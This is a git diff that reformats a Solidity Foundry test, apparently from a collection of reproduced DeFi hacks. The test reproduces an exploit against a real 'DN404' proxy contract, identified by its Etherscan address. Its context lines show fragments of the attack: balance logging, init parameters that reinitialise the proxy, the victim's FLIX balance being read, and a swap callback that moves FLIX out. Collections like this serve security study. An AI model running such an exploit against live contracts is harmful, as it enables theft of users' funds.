@@ -14,22 +14,14 @@ import "../interface.sol";
 // Vulnerable Contract Code : https://etherscan.io/address/0x2c7112245fc4af701ebf90399264a7e89205dad4#code
 
 // @Analysis
-// Post-mortem : 
-// Twitter Guy : 
-// Hacking God : 
+// Post-mortem :
+// Twitter Guy :
+// Hacking God :
 
 interface IProxy {
-    function init(
-        IERC20 initToken,
-        uint256 initPeriods,
-        uint256 initInterval
-    ) external;
+    function init(IERC20 initToken, uint256 initPeriods, uint256 initInterval) external;
 
-    function withdraw(
-        IERC20 otherToken,
-        uint256 amount,
-        address receiver
-    ) external;
+    function withdraw(IERC20 otherToken, uint256 amount, address receiver) external;
 }
 
 contract DN404 is Test {
@@ -52,7 +44,7 @@ contract DN404 is Test {
     function testExploit() public {
         // Implement exploit code here
         emit log_named_decimal_uint(" Attacker USDT Balance Before exploit", IERC20(USDT).balanceOf(address(this)), 6);
-        
+
         uint256 initPeriods = 1;
         uint256 initInterval = 1_000_000_000_000_000_000;
         uint256 amount = IERC20(FLIX).balanceOf(address(victim));
@@ -64,11 +56,7 @@ contract DN404 is Test {
         emit log_named_decimal_uint(" Attacker USDT Balance After exploit", IERC20(USDT).balanceOf(address(this)), 6);
     }
 
-      function uniswapV3SwapCallback(
-        int256 amount0Delta,
-        int256,
-        bytes memory
-    ) external {
+    function uniswapV3SwapCallback(int256 amount0Delta, int256, bytes memory) external {
         IERC20(FLIX).transfer(msg.sender, uint256(amount0Delta));
     }
 
